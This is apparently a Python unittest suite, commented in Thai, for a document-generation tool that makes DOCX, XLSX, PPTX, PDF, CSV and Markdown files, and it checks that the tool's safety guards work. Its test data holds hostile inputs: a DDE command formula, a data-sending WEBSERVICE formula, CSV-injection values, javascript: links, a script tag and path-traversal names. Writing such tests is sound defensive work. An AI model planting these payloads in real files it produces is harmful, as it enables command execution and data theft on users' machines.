# -*- coding: utf-8 -*-
"""เทสต์ make_file (สัญญา K1: local_do action="make_file") — ทุกไฟล์อยู่ในข้อมูลโปรเจกต์จำลอง (temp)

ตรวจ
  * ทุกรูปแบบ (docx/xlsx/pptx/pdf/csv/md) สร้างได้ เปิดกลับด้วยไลบรารีจริงได้ และคืนลิงก์ /_qwen/out/<ชื่อ>
  * DOCX ตั้งฟอนต์ไทยชุด cs (rFonts/@cs, bCs, szCs) — ไม่งั้นหัวข้อภาษาไทยไม่หนา / PPTX เป็น OOXML ที่ถูกต้อง
  * XLSX แปลงตัวเลข เก็บเลขนำหน้า 0 เป็นข้อความ สูตรนอกรายการปลอดภัย (WEBSERVICE/DDE) เป็นข้อความ
  * CSV มี BOM และกัน CSV injection / PDF ข้อความไทยค้นได้ (Edge) และ HTML ที่ส่งให้ Edge ปิดสคริปต์/เน็ต
  * เขียนได้เฉพาะ outputs ของโปรเจกต์: ชื่อที่มี path/.. /ชื่ออุปกรณ์/ADS ถูกทำให้ปลอดภัย, outputs ที่เป็น
    junction ถูกปฏิเสธ, ชื่อซ้ำต้องยืนยันสองขั้น และ token ผูกกับเนื้อหาใหม่ + ไฟล์เดิม
  * รูปใน Markdown ฝังได้เฉพาะไฟล์รูปจริงใน outputs/attachments ของโปรเจกต์ ไม่ดึงจากเว็บ
  * fixer 2026-09-30: xlsx/csv รับ CSV/TSV ดิบและรายการ ไม่มีตาราง = ERROR (ไม่สร้างไฟล์ว่าง), ตัวไทยในโค้ด
    DOCX เป็นรันของ Leelawadee UI, PPTX ระยะบรรทัด 115% + แบ่งสไลด์ตามความสูง
"""
import csv
import json
import os
import subprocess
import sys
import unittest
import zipfile
from urllib.parse import quote

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import test_security_common as C  # noqa: E402

guard = C.import_local("guard")
tools_docs = C.import_local("tools_docs")
extract = C.import_local("extract")

MD = """# รายงานตรวจสอบตู้ชาร์จ

สรุป **ตัวหนา** และ *เอียง* กับ `code` ดู [OCPP](https://www.openchargealliance.org/) และ [อันตราย](javascript:alert(1))

## ปัญหา

- แรงดันตก
  - ช่วงเย็น
- สายชำรุด

1. ตรวจสอบ
2. แก้ไข

| ตู้ | ครั้ง | kWh |
|---|---:|---:|
| ตู้ 1 | 2 | 1,234.5 |
| ตู้ 2 | 0 | 980 |

> หมายเหตุ

```
print("hi")
```
"""


def _proj(name):
    return "docs-%s-%s" % (name, os.urandom(3).hex())


def _out(project, name):
    return os.path.join(C.PROJECT_DATA, guard.project_slug(project), "outputs", name)


class MarkdownParserTests(unittest.TestCase):
    def test_blocks(self):
        b = tools_docs.parse_markdown(MD)
        kinds = [x["t"] for x in b]
        # รายการจุดตามด้วยรายการเลข (คั่นบรรทัดว่าง) รวมเป็นบล็อกเดียว แต่ละข้อจำชนิดของตัวเอง
        # ตัวเขียนทุกแบบสลับ ul/ol และเริ่มนับเลขใหม่ให้เองจากธง ordered รายข้อ
        self.assertEqual(kinds, ["h", "p", "h", "list", "table", "quote", "code"])
        items = b[3]["items"]
        self.assertEqual([i["level"] for i in items], [0, 1, 0, 0, 0])
        self.assertEqual([i["ordered"] for i in items], [False, False, False, True, True])
        self.assertEqual(b[4]["align"], ["left", "right", "right"])
        self.assertEqual(tools_docs.plain(b[4]["rows"][0][2]), "1,234.5")
        self.assertEqual(b[6]["text"], 'print("hi")')
        html = tools_docs._list_html(items)
        self.assertEqual(html.count("<ul>"), 2)                  # ul ซ้อนหนึ่งชั้น
        self.assertEqual(html.count("<ol>"), 1)

    def test_inline_styles_and_links(self):
        spans = tools_docs.parse_inline("a **b** *c* `d` ~~e~~ [f](https://x.y) \\*g\\* snake_case_name")
        by = {s.text: s for s in spans}
        self.assertTrue(by["b"].b)
        self.assertTrue(by["c"].i)
        self.assertTrue(by["d"].code)
        self.assertTrue(by["e"].s)
        self.assertEqual(by["f"].link, "https://x.y")
        self.assertIn("*g*", tools_docs.plain(spans))
        self.assertIn("snake_case_name", tools_docs.plain(spans))   # ขีดล่างในชื่อตัวแปรไม่ใช่ตัวเอียง

    def test_safe_url_only_web_and_mail(self):
        self.assertEqual(tools_docs.safe_url("https://a.b/c"), "https://a.b/c")
        self.assertEqual(tools_docs.safe_url("mailto:a@b.c"), "mailto:a@b.c")
        for bad in ("javascript:alert(1)", "file:///C:/x", "data:text/html,x", "\\\\host\\share"):
            self.assertEqual(tools_docs.safe_url(bad), "", bad)

    def test_table_with_escaped_pipe(self):
        b = tools_docs.parse_markdown("| a | b |\n|---|---|\n| x \\| y | z |\n")
        self.assertEqual(tools_docs.plain(b[0]["rows"][0][0]), "x | y")


class SafeNameTests(unittest.TestCase):
    def test_names(self):
        sn = tools_docs.safe_name
        self.assertEqual(sn("รายงาน", "docx"), "รายงาน.docx")
        self.assertEqual(sn("report.docx", "docx"), "report.docx")
        self.assertEqual(sn("report.txt", "pdf"), "report.pdf")
        self.assertEqual(sn("v1.2 final", "xlsx"), "v1.2 final.xlsx")
        self.assertEqual(sn(r"..\..\mcp-local\guard", "md"), "guard.md")
        self.assertEqual(sn("C:/LLM/mcp-local/x.md", "md"), "x.md")
        self.assertEqual(sn("CON", "md"), "_CON.md")
        self.assertEqual(sn("lpt1.txt", "csv"), "_lpt1.csv")
        self.assertEqual(sn("COM¹", "md"), "_COM¹.md")              # Windows ถือเป็นอุปกรณ์เหมือน COM1
        self.assertEqual(sn(".bashrc", "md"), "bashrc.md")
        self.assertEqual(sn("~$lock", "docx"), "lock.docx")
        self.assertEqual(sn("a.md:stream", "md"), "a.md_stream.md")
        self.assertEqual(sn('bad<>|?*"name', "csv"), "bad______name.csv")
        self.assertTrue(sn("", "pdf", fallback="หัวข้อเอกสาร").startswith("หัวข้อเอกสาร"))
        self.assertLessEqual(len(sn("ก" * 500, "docx")), 105)

    def test_link_is_percent_encoded(self):
        self.assertEqual(tools_docs.out_link("รายงาน 1.docx"),
                         "[รายงาน 1.docx](/_qwen/out/%s)" % quote("รายงาน 1.docx", safe=""))


class MakeFileFormatTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.project = _proj("fmt")

    def make(self, **kw):
        with guard.project_scope(self.project):
            return tools_docs.make_file(project=self.project, **kw)

    def test_md_exact(self):
        r = self.make(format="md", name="note", content="# หัว\nข้อความ\n")
        self.assertIn("(/_qwen/out/note.md)", r)
        with open(_out(self.project, "note.md"), encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "# หัว\nข้อความ\n")

    def test_docx_thai_fonts_structure_and_links(self):
        r = self.make(format="docx", name="rep", content=MD)
        self.assertIn("สร้างไฟล์แล้ว", r)
        self.assertIn("(/_qwen/out/rep.docx)", r)
        import docx
        from docx.oxml.ns import qn
        d = docx.Document(_out(self.project, "rep.docx"))
        styles = [p.style.name for p in d.paragraphs]
        self.assertIn("Heading 1", styles)
        self.assertIn("List Bullet 2", styles)
        self.assertIn("List Number", styles)
        self.assertEqual(len(d.tables), 1)
        self.assertEqual(d.tables[0].cell(1, 2).text, "1,234.5")
        h1 = d.styles["Heading 1"].element.rPr
        rf = h1.find(qn("w:rFonts"))
        self.assertEqual(rf.get(qn("w:cs")), tools_docs.FONT)
        self.assertIsNone(rf.get(qn("w:cstheme")))                 # theme ต้องไม่ชนะฟอนต์ไทยที่ตั้ง
        self.assertIsNotNone(h1.find(qn("w:bCs")))                 # หัวข้อไทยหนาจริง
        self.assertIsNotNone(h1.find(qn("w:szCs")))
        sec = d.sections[0]
        self.assertAlmostEqual(sec.page_width.cm, 21.0, places=1)  # A4
        rels = [r.target_ref for r in d.part.rels.values() if r.is_external]
        self.assertIn("https://www.openchargealliance.org/", rels)
        self.assertFalse(any(t.startswith("javascript") for t in rels))
        self.assertEqual(d.core_properties.author, "")

    def test_xlsx_values_and_formula_policy(self):
        spec = {"sheets": [{"name": "ข้อมูล/ทดสอบ", "columns": ["a", "b", "c", "d", "e"],
                            "rows": [["0012", "1,234", "=SUM(B2:B3)", '=WEBSERVICE("http://x/?"&A1)',
                                      "=cmd|' /c calc'!A0"],
                                     ["12.5%", 7, "=[other.xlsx]S!A1", "=HYPERLINK(\"http://x\")", None]]}]}
        r = self.make(format="xlsx", name="t", spec=json.dumps(spec))
        self.assertIn("สูตร", r)
        import openpyxl
        ws = openpyxl.load_workbook(_out(self.project, "t.xlsx")).worksheets[0]
        self.assertEqual(ws.title, "ข้อมูล ทดสอบ")                 # / ห้ามในชื่อชีต
        self.assertEqual(ws["A2"].value, "0012")
        self.assertEqual(ws["B2"].value, 1234)
        self.assertEqual(ws["C2"].value, "=SUM(B2:B3)")
        self.assertEqual(ws["C2"].data_type, "f")
        for ref in ("D2", "E2", "C3", "D3"):
            self.assertEqual(ws[ref].data_type, "s", ref)        # สูตรอันตรายเป็นข้อความ ไม่คำนวณ
        self.assertAlmostEqual(ws["A3"].value, 0.125)
        self.assertEqual(ws.freeze_panes, "A2")
        self.assertEqual(ws["A2"].font.name, tools_docs.FONT)

    def test_xlsx_malformed_formulas_stay_text(self):
        v = tools_docs.xl_value
        self.assertTrue(v("=")[2])
        self.assertTrue(v("=SUM(")[2])
        self.assertTrue(v('=IF(A1>0,"ok)')[2])
        self.assertTrue(v("=hello world")[2])
        self.assertFalse(v('=IF(A1>0,"ปกติ(ดี)","ผิด")')[2])      # วงเล็บในเครื่องหมายคำพูดไม่นับ
        self.assertFalse(v("=A1*2")[2])
        self.assertFalse(v("=ROUND(B2/C2,2)")[2])

    def test_inline_parse_is_bounded(self):
        import time
        t0 = time.time()
        spans = tools_docs.parse_inline("`a " * 40000)
        self.assertLess(time.time() - t0, 2.0)
        self.assertEqual(tools_docs.plain(spans), "`a " * 40000)

    def test_xlsx_from_markdown_tables(self):
        self.make(format="xlsx", name="md", content=MD)
        import openpyxl
        wb = openpyxl.load_workbook(_out(self.project, "md.xlsx"))
        self.assertEqual(wb.sheetnames, ["ปัญหา"])                 # ชื่อชีตจากหัวข้อก่อนตาราง
        self.assertEqual(wb.worksheets[0]["C2"].value, 1234.5)

    def test_csv_bom_and_injection_guard(self):
        spec = {"columns": ["x", "y"], "rows": [["=1+2", "-5"], ["@SUM(A1)", "+66812345678"], ["ปกติ", 3]]}
        self.make(format="csv", name="c", spec=spec)
        with open(_out(self.project, "c.csv"), "rb") as fh:
            raw = fh.read()
        self.assertTrue(raw.startswith(b"\xef\xbb\xbf"))
        text = raw.decode("utf-8-sig")
        self.assertIn("'=1+2", text)
        self.assertIn("'@SUM(A1)", text)
        self.assertIn(",-5", text)                                  # ตัวเลขติดลบไม่ถูกแตะ
        self.assertIn("ปกติ,3", text)

    def test_csv_without_table_explains(self):
        r = self.make(format="csv", name="none", content="แค่ข้อความ")
        self.assertIn("ERROR", r)
        self.assertFalse(os.path.exists(_out(self.project, "none.csv")))

    # ---- fixer 2026-09-30: xlsx/csv จาก CSV ดิบ (E2E จริง: โมเดล 4B ได้ไฟล์ที่ทุกอย่างอยู่ใน A1 "0 แถวข้อมูล")
    def _rows(self, name):
        import openpyxl
        ws = openpyxl.load_workbook(_out(self.project, name)).worksheets[0]
        return ws.title, [[c.value for c in r] for r in ws.iter_rows()]

    def test_xlsx_from_raw_csv_content(self):
        r = self.make(format="xlsx", name="ux4-สถานี", content="สถานี,ขัดข้อง\nเชียงใหม่,2\nลำปาง,0")
        self.assertIn("สร้างไฟล์แล้ว", r)
        self.assertIn("2 แถวข้อมูล", r)
        self.assertIn("จุลภาค", r)                                           # บอกว่าตีความ content อย่างไร
        _t, rows = self._rows("ux4-สถานี.xlsx")
        self.assertEqual(rows, [["สถานี", "ขัดข้อง"], ["เชียงใหม่", 2], ["ลำปาง", 0]])

    def test_csv_from_raw_csv_content(self):
        r = self.make(format="csv", name="raw", content='สถานี,หมายเหตุ\nเชียงใหม่,"เสีย, รอช่าง"\n')
        self.assertIn("1 แถวข้อมูล", r)
        with open(_out(self.project, "raw.csv"), encoding="utf-8-sig") as fh:
            self.assertEqual(list(csv.reader(fh)), [["สถานี", "หมายเหตุ"], ["เชียงใหม่", "เสีย, รอช่าง"]])

    def test_xlsx_tsv_fenced_and_heading_name(self):
        self.make(format="xlsx", name="tsv", content="# ตู้ขัดข้อง\n\n```\nตู้\tครั้ง\nA-1\t3\n```\n")
        title, rows = self._rows("tsv.xlsx")
        self.assertEqual(title, "ตู้ขัดข้อง")
        self.assertEqual(rows, [["ตู้", "ครั้ง"], ["A-1", 3]])

    def test_xlsx_list_becomes_one_column(self):
        r = self.make(format="xlsx", name="lst", content="# ตู้ที่ต้องซ่อม\n\n- ตู้ 1\n- ตู้ 3\n")
        self.assertIn("2 แถวข้อมูล", r)
        _t, rows = self._rows("lst.xlsx")
        self.assertEqual(rows, [["ตู้ที่ต้องซ่อม"], ["ตู้ 1"], ["ตู้ 3"]])

    def test_xlsx_without_table_is_error_not_empty_file(self):
        for content in ("รายงานสรุป ตู้ชาร์จปกติทุกตู้", "a,b\n1,2,3\n4",                # จำนวนช่องไม่เท่ากัน
                        "# หัวข้อ\n\nย่อหน้า\n\n- รายการ"):
            r = self.make(format="xlsx", name="prose", content=content)
            self.assertTrue(r.startswith("ERROR: xlsx ต้องมีข้อมูลเป็นตาราง"), r)
            self.assertIn("|---|", r)                                          # ตัวอย่างที่ลอกไปใช้ได้
            self.assertFalse(os.path.exists(_out(self.project, "prose.xlsx")))
        r = self.make(format="xlsx", name="prose", spec={"sheets": []})
        self.assertIn("ERROR", r)

    def test_table_error_comes_before_overwrite_confirm(self):
        self.make(format="xlsx", name="keep", content="| a |\n|---|\n| 1 |\n")
        r = self.make(format="xlsx", name="keep", content="ไม่มีตาราง")
        self.assertTrue(r.startswith("ERROR"), r)                            # ไม่ขอให้ผู้ใช้กดอนุมัติเพื่อได้ ERROR
        self.assertNotIn("confirm_token", r)

    def test_text_outside_tables_is_reported(self):
        r = self.make(format="xlsx", name="mix", content="# ก\n\nสรุปสั้นๆ\n\n| a |\n|---|\n| 1 |\n")
        self.assertIn("ข้อความนอกตาราง 1 ส่วน", r)

    def test_docx_thai_inside_code_gets_its_own_runs(self):
        # Word เลือกฟอนต์ให้ตัวไทยจาก ascii/hAnsi ไม่ใช่ w:cs — ตัวไทยในรัน Consolas กลายเป็น Browallia New ตัวจิ๋ว
        # (วัดจาก PDF ที่ Word ส่งออก) จึงต้องแยกตัวไทยเป็นรันของตัวเองที่ใช้ Leelawadee UI ทุกช่อง
        md = "# โค้ด\n\nมี `โค้ดไทย x()` ในบรรทัด\n\n```\nprint(\"สวัสดี OCPP\")  # ตรวจ\n```\n"
        self.make(format="docx", name="code", content=md)
        import docx
        from docx.oxml.ns import qn
        d = docx.Document(_out(self.project, "code.docx"))
        runs = [r for p in d.paragraphs for r in p.runs]

        def font(run):
            rf = run._r.rPr.find(qn("w:rFonts"))
            return rf.get(qn("w:ascii")), rf.get(qn("w:hAnsi")), rf.get(qn("w:cs"))
        by_text = {r.text: r for r in runs}
        for thai in ("โค้ดไทย", "สวัสดี", "ตรวจ"):
            self.assertEqual(font(by_text[thai]), (tools_docs.FONT,) * 3, thai)
        self.assertEqual(font(by_text[" x()"])[:2], (tools_docs.MONO, tools_docs.MONO))
        self.assertTrue(any(r.text.startswith("print(") and font(r)[0] == tools_docs.MONO for r in runs))
        code_sz = {r.text: r._r.rPr.find(qn("w:sz")).get(qn("w:val")) for r in runs if r.text in ("สวัสดี", "ตรวจ")}
        self.assertEqual(set(code_sz.values()), {"19"})                     # ขนาดเท่าโค้ด (9.5pt)

    def test_pptx_thai_line_spacing_and_height_pagination(self):
        # ระยะบรรทัด 115% (100% ทำให้สระล่าง/บนของบรรทัดติดกันชนกัน) และแบ่งสไลด์ตามความสูงจริง
        bullets = "\n".join("- ข้อ %d: ทุกตู้ต้องได้รับการตรวจ" % i for i in range(1, 12))
        md = "## เต็ม\n\n%s\n\n## ตาราง\n\n| ก | ข |\n|---|---|\n| ตู้ | ผู้ใหญ่ |\n" % bullets
        r = self.make(format="pptx", name="lnspc", content=md)
        path = _out(self.project, "lnspc.pptx")
        with zipfile.ZipFile(path) as z:
            master = z.read("ppt/slideMasters/slideMaster1.xml").decode()
            body = master[master.index("<p:bodyStyle>"):master.index("</p:bodyStyle>")]
            self.assertEqual(body.count('<a:spcPct val="%d"/>' % tools_docs.LNSPC), 5)
            self.assertEqual(tools_docs.LNSPC, 115000)
            tables = [z.read(n).decode() for n in z.namelist() if n.startswith("ppt/slides/slide")
                      and n.endswith(".xml") and "<a:tbl>" in z.read(n).decode()]
            self.assertTrue(tables)
            self.assertIn('<a:lnSpc><a:spcPct val="115000"/></a:lnSpc>', tables[0])
        out = extract.extract_text(path, max_chars=20000)
        self.assertIn("เต็ม (ต่อ)", out)                                      # 11 บรรทัดไม่พอดีสไลด์เดียวแล้ว
        self.assertIn("3 สไลด์", r)                                          # เต็ม, เต็ม (ต่อ), ตาราง
        one = {"lvl": 0, "bullet": True, "spans": [tools_docs.Span("ข้อสั้น")]}
        nine = tools_docs._Pptx._stack_h([one] * 9)
        ten = tools_docs._Pptx._stack_h([one] * 10)
        self.assertLessEqual(nine, tools_docs.BODY_ROOM_PT)                   # วัดจาก PowerPoint: 9 บรรทัดพอดี
        self.assertGreater(ten, tools_docs.BODY_ROOM_PT)

    def test_pptx_is_valid_ooxml(self):
        # ลิงก์ในหัวปก (subtitle) เป็นข้อความล้วน จึงใส่ลิงก์ในรายการของสไลด์เนื้อหาด้วย
        md = MD + "\n## ลิงก์\n\n- ดู [สเปก](https://example.com/spec) และ [ห้าม](javascript:alert(1))\n"
        r = self.make(format="pptx", name="deck", content=md)
        self.assertIn("สไลด์", r)
        path = _out(self.project, "deck.pptx")
        import xml.etree.ElementTree as ET
        with zipfile.ZipFile(path) as z:
            names = set(z.namelist())
            for part in ("[Content_Types].xml", "ppt/presentation.xml", "ppt/slideMasters/slideMaster1.xml",
                         "ppt/slideLayouts/slideLayout1.xml", "ppt/theme/theme1.xml", "ppt/slides/slide1.xml"):
                self.assertIn(part, names)
            for n in names:
                if n.endswith((".xml", ".rels")):
                    ET.fromstring(z.read(n))                        # XML ทุกส่วน parse ได้
            ct = z.read("[Content_Types].xml").decode()
            slides = [n for n in names if n.startswith("ppt/slides/slide")]
            for s in slides:
                self.assertIn("/" + s, ct)
            theme = z.read("ppt/theme/theme1.xml").decode()
            self.assertIn('script="Thai" typeface="%s"' % tools_docs.FONT, theme)
            rels = "".join(z.read(n).decode() for n in names if n.startswith("ppt/slides/_rels/"))
            self.assertIn('TargetMode="External"', rels)
            self.assertNotIn("javascript", rels)
            s1 = z.read("ppt/slides/slide1.xml").decode()
            self.assertIn("<a:bodyPr/>", s1)                       # รับ anchor จาก layout (ชื่อชิดเส้นเน้น)
        self.assertIn("### ปัญหา", extract.extract_text(path))

    def test_pptx_long_content_is_split(self):
        bullets = "\n".join("- ข้อ %d: ข้อความยาวพอสมควรสำหรับทดสอบการแบ่งสไลด์อัตโนมัติ" % i for i in range(30))
        rows = "\n".join("| %d | สถานี %d |" % (i, i) for i in range(40))
        md = "## ยาว\n\n%s\n\n## ตาราง\n\n| n | name |\n|---|---|\n%s\n" % (bullets, rows)
        self.make(format="pptx", name="long", content=md)
        out = extract.extract_text(_out(self.project, "long.pptx"), max_chars=60000)
        self.assertIn("ยาว (ต่อ)", out)
        self.assertIn("ตาราง (ต่อ)", out)
        self.assertIn("ข้อ 29", out)
        self.assertIn("| 39 | สถานี 39 |", out)

    def test_pptx_spec(self):
        spec = {"title": "สรุป", "subtitle": "ทีม", "slides": [
            {"title": "หนึ่ง", "bullets": ["ก", ["ข", "ค"]]},
            {"title": "สอง", "table": {"columns": ["a"], "rows": [[1]]}}, "สาม"]}
        r = self.make(format="pptx", name="spec", spec=json.dumps(spec, ensure_ascii=False))
        self.assertIn("4 สไลด์", r)
        out = extract.extract_text(_out(self.project, "spec.pptx"))
        self.assertIn("  - ข", out)

    def test_bad_spec_and_format(self):
        self.assertIn("ERROR", self.make(format="xlsx", name="x", spec="{not json"))
        self.assertIn("ERROR", self.make(format="exe", name="x", content="a"))
        self.assertIn("ERROR", self.make(format="docx", name="x", content=""))
        self.assertIn("ERROR", self.make(format="docx", name="x", spec='{"a":1}'))

    def test_pdf_thai_text_is_real_text_and_html_is_locked_down(self):
        html = tools_docs.html_document(tools_docs.parse_markdown("<script>alert(1)</script> **ก**"),
                                        "t", tools_docs.project_dirs(self.project), [], {})
        self.assertIn("default-src 'none'", html)
        self.assertNotIn("<script>", html)
        self.assertIn("&lt;script&gt;", html)
        r = self.make(format="pdf", name="rep", content=MD)
        self.assertIn("สร้างไฟล์แล้ว", r)
        path = _out(self.project, "rep.pdf")
        with open(path, "rb") as fh:
            self.assertEqual(fh.read(5), b"%PDF-")
        if "(Edge)" not in r:
            self.skipTest("ไม่มี Edge — ใช้ทางสำรอง PyMuPDF (ข้อความไทยใน PDF ค้นหาไม่ได้)")
        import pymupdf as fz
        with fz.open(path) as d:
            text = "".join(p.get_text() for p in d)
        self.assertIn("รายงานตรวจสอบตู้ชาร์จ", text)
        self.assertIn("1,234.5", text)


class MakeFileImageTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.project = _proj("img")
        with guard.project_scope(cls.project):
            dirs = tools_docs.project_dirs(cls.project, create_outputs=True)
        import pymupdf as fz
        pix = fz.Pixmap(fz.csRGB, fz.IRect(0, 0, 40, 20), False)
        pix.clear_with(200)
        pix.save(os.path.join(dirs.outputs, "fig.png"))
        with open(os.path.join(dirs.outputs, "fake.png"), "wb") as fh:
            fh.write(b"not an image at all")
        cls.dirs = dirs

    def test_image_info_reads_headers(self):
        with open(os.path.join(self.dirs.outputs, "fig.png"), "rb") as fh:
            self.assertEqual(tools_docs.image_info(fh.read()), ("png", 40, 20))

    def test_images_resolve_only_inside_project(self):
        notes = []
        with guard.project_scope(self.project):
            got = tools_docs.resolve_image("/_qwen/out/fig.png", self.dirs, notes)
            self.assertIsNotNone(got)
            self.assertIsNotNone(tools_docs.resolve_image(r"..\..\..\outputs\fig.png", self.dirs, notes))
            self.assertIsNone(tools_docs.resolve_image("https://example.com/fig.png", self.dirs, notes))
            self.assertIsNone(tools_docs.resolve_image("fake.png", self.dirs, notes))
            self.assertIsNone(tools_docs.resolve_image(r"C:\Windows\Web\Wallpaper\x.jpg", self.dirs, notes))
        joined = " ".join(notes)
        self.assertIn("ไม่ฝังรูปจากเว็บ", joined)
        self.assertIn("ไม่ใช่รูป", joined)

    def test_image_embedded_in_docx_pdf_pptx(self):
        md = "# ก\n\n![กราฟ](/_qwen/out/fig.png)\n"
        with guard.project_scope(self.project):
            for fmt in ("docx", "pptx", "pdf"):
                r = tools_docs.make_file(format=fmt, name="img", content=md, project=self.project)
                self.assertIn("สร้างไฟล์แล้ว", r, r)
                if fmt != "pptx":
                    self.assertIn("1 รูป", r)
        with zipfile.ZipFile(_out(self.project, "img.pptx")) as z:
            self.assertTrue(any(n.startswith("ppt/media/") for n in z.namelist()))


class MakeFileSafetyTests(unittest.TestCase):
    def setUp(self):
        self.project = _proj("safe")

    def make(self, **kw):
        with guard.project_scope(self.project):
            return tools_docs.make_file(project=self.project, **kw)

    def test_path_in_name_stays_in_outputs(self):
        for name in (r"..\..\escape", r"C:\LLM\mcp-local\guard", "sub/dir/x", r"\\server\share\y"):
            r = self.make(format="md", name=name, content="x")
            self.assertIn("สร้างไฟล์แล้ว", r, r)
        outs = os.listdir(os.path.dirname(_out(self.project, "x")))
        self.assertTrue({"escape.md", "guard.md", "x.md", "y.md"} <= set(outs), outs)
        self.assertFalse(os.path.exists(os.path.join(C.PROJECT_DATA, "escape.md")))

    def test_overwrite_requires_confirm_bound_to_content_and_old_file(self):
        self.assertIn("สร้างไฟล์แล้ว", self.make(format="md", name="a", content="v1"))
        hint = self.make(format="md", name="a", content="v2")
        self.assertIn("ต้องยืนยัน", hint)
        tok = C.token_from_hint(hint)
        self.assertTrue(tok)
        # token ส่งตรงๆ โดยไม่ผ่าน local_confirm ใช้ไม่ได้
        self.assertIn("ใช้ไม่ได้", self.make(format="md", name="a", content="v2", confirm_token=tok))
        with open(_out(self.project, "a.md"), encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "v1")
        # token ของเนื้อหา v2 เอาไปเขียน v3 ไม่ได้
        with C.confirming(guard, tok):
            self.assertIn("ใช้ไม่ได้", self.make(format="md", name="a", content="v3", confirm_token=tok))
        # ไฟล์เดิมเปลี่ยนระหว่างรออนุมัติ -> token ใช้ไม่ได้
        tok2 = C.token_from_hint(self.make(format="md", name="a", content="v2"))
        with open(_out(self.project, "a.md"), "w", encoding="utf-8") as fh:
            fh.write("changed")
        with C.confirming(guard, tok2):
            self.assertIn("ใช้ไม่ได้", self.make(format="md", name="a", content="v2", confirm_token=tok2))
        # ขอใหม่แล้วยืนยันถูกช่อง -> เขียนทับ + checkpoint (undo ได้)
        tok3 = C.token_from_hint(self.make(format="md", name="a", content="v2"))
        with C.confirming(guard, tok3):
            r = self.make(format="md", name="a", content="v2", confirm_token=tok3)
        self.assertIn("เขียนทับแล้ว", r)
        with open(_out(self.project, "a.md"), encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "v2")
        if tools_docs._checkpoint_api() is not None:
            self.assertIn("checkpoint", r)

    def test_confirm_token_is_project_bound(self):
        self.make(format="md", name="b", content="v1")
        tok = C.token_from_hint(self.make(format="md", name="b", content="v2"))
        other = _proj("other")
        with guard.project_scope(other), C.confirming(guard, tok):
            r = tools_docs.make_file(format="md", name="b", content="v2", project=other, confirm_token=tok)
        self.assertIn("สร้างไฟล์แล้ว", r)            # โปรเจกต์อื่นยังไม่มีไฟล์ b.md = สร้างใหม่ของตัวเอง
        with open(_out(self.project, "b.md"), encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "v1")           # ไฟล์ของโปรเจกต์เดิมไม่ถูกแตะ

    def test_outputs_junction_is_refused(self):
        base = os.path.join(C.PROJECT_DATA, guard.project_slug(self.project))
        os.makedirs(base, exist_ok=True)
        elsewhere = C.new_dir("junction-target")
        link = os.path.join(base, "outputs")
        rc = subprocess.run(["cmd", "/c", "mklink", "/J", link, elsewhere], capture_output=True).returncode
        if rc != 0 or not os.path.isdir(link):
            self.skipTest("สร้าง junction ไม่ได้")
        r = self.make(format="md", name="j", content="x")
        self.assertIn("ปฏิเสธ", r)
        self.assertEqual(os.listdir(elsewhere), [])

    def test_no_scope_fails_closed(self):
        r = tools_docs.make_file(format="md", name="n", content="x", project=_proj("noscope"))
        self.assertIn("ปฏิเสธ", r)


if __name__ == "__main__":
    unittest.main()
